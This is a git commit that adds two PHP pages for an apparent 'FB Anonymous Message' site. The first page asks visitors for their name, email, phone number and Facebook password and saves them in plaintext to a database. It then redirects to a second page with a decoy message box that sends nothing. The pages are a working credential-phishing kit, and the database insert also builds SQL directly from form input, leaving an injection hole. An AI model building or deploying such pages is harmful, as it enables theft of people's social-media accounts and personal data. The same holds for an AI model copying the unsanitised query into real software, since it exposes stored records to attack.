c5d06ec46c03a9efa56ceb139887e03d6f44b0d6
barnabas-agbulu <89652749+barnabas-agbulu@users.noreply.github.com>
2022-01-06 12:15:13 +0100

    Add files via upload

---
+++ home.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FB Anonymous Message</title>
+    <link rel="stylesheet" href="home.css">
+    
+</head>
+<body>
+<center>
+   <div class="box" > 
+       <br>
+        <h1>WELLCOME !!!</h1>
+        <h2>Write an anonymous message to your friend</h2>
+        <h3>Enter Facebook Details</h3>
+        <br>
+
+<div id="webform" class="webform">
+<h2>Web Form</h2>
+<form action="" method="post" id="loginForm">
+<label>Name :</label>
+<input type="text" name="name" required placeholder="Please Enter Name"/><br><br>
+<label> Email :</label>
+<input type="email" name="email" required placeholder="qwerty@gmail.com"/><br><br>
+<label style="padding-right:60px;" >Mobile number :<input   type="text" name="number" required placeholder="type mobile num"/></label>
+<br><br>
+<label style="padding-right:50px;"  > FB Password :<input type="password" name="password" required placeholder="password"/></label>
+<br><br>
+<!-- <label> City :</label>
+<input type="text" name="city" required placeholder="Please Enter Your City"/><br><br> -->
+<select name="gender" required>
+    <option value=""> Select Gender </option>
+    <option value="M"> Male </option>
+    <option value="F"> Female </option>
+</select>
+<br><br>
+<!-- <input type="submit" value=" Submit Details " name="submit" id="btn" /> -->
+<button name="submit" id="btn" type="submit" onclick="newDoc()" class="btn">SUBMIT</button>
+<br />
+<br>
+</form>
+
+
+<?php
+if(isset($_POST["submit"])){
+include 'home2.php';
+
+$sql = "INSERT INTO entries (name, email,number, gender,password)
+VALUES ('".$_POST["name"]."','".$_POST["email"]."','".$_POST["number"]."','".$_POST["gender"]."','".$_POST["password"]."')";
+
+if ($conn->query($sql) === TRUE) {
+
+
+echo "
+    <script type= 'text/javascript'>
+        alert('New record created successfully');
+    </script>";
+    header('location:well.php');
+} 
+else 
+{
+    echo 
+    "<script type= 'text/javascript'>
+        alert('Error: " . $sql . "<br>" . $conn->error."');
+    </script>";
+}
+
+
+
+
+
+
+
+
+$conn->close();
+
+
+
+}
+?>
+    </div>
+    
+</center>
+
+
+</body>
+</html>
---
+++ well.php
@@ -0,0 +1,120 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FB Anonymous Message</title>
+    <link rel="stylesheet" href="home2.css">
+    <style type="text/css" > 
+     msg {
+       color: red;
+       font-size:35px;
+    background-color: grey;
+    border-radius:10px;
+    font-family: sans-serif;
+     }
+     msg1{
+        color: green;
+    font-size:35px;
+    background-color: grey;
+    border-radius:10px;
+    font-family: sans-serif;
+     }
+     msg2{
+        color: white;
+    font-size:35px;
+    background-color: grey;
+    border-radius:10px;
+    font-family: sans-serif;
+     }
+    </style>
+</head>
+<body>
+<a href="home.php"  ><button  style="color: red; background-color: black;" >BACK</button></a>
+  <center>
+    <div class="box">
+  
+        <br>
+        <h1>WELLCOME !!!</h1>
+        <h2>Write your anonymous message to your friend</h2>
+        <br><br><br>
+    <form action="well.php" method="post">
+        <input type="text" placeholder="type your message" class="input" name="input" >
+        <br><br><br><br><br>
+        <button class="btn" name="submit">SEND</button>
+        <br><br>
+    </form>
+    </div>
+    <br>
+  </center>
+</body>
+</html>
+
+<?php
+
+// else 
+// {
+// echo 
+// "<script type= 'text/javascript'>
+//     alert('Error: " . $sql . "<br>" . $conn->error."');
+// </script>";
+// }
+
+
+// header('location:well.php');
+// $data = $_POST ["input"];  
+
+
+
+if (empty ($_POST["input"])) {  
+    echo "<msg2>";
+    $errMsg = " Enter your message.";  
+             echo $errMsg; 
+    echo "</msg2>"; 
+} else {  
+    $data = $_POST["input"];  
+
+
+
+
+    if (preg_match ("/^[a-zA-z]*$/", $data) ){
+        echo "<msg1>";
+      $Msg = "Message sent";
+      echo $Msg;
+      echo "</msg1>";
+     
+       
+    }
+        
+    
+    
+    if (!preg_match ("/^[a-zA-z]*$/", $data) ){
+        
+    
+    
+       
+        $ErrMsg = "Text is not valid.Text should contain alphabets only.";  
+        echo "<msg>";
+         echo $ErrMsg;  
+         echo "</msg>";
+    
+                // if(isset($_POST["submit"])){
+    
+        
+                //     echo "
+                //     <script type= 'text/javascript'>
+                //         alert('Mesage not sent successfully');
+                //     </script>";
+                    
+    } 
+} 
+
+
+
+
+
+
+
+
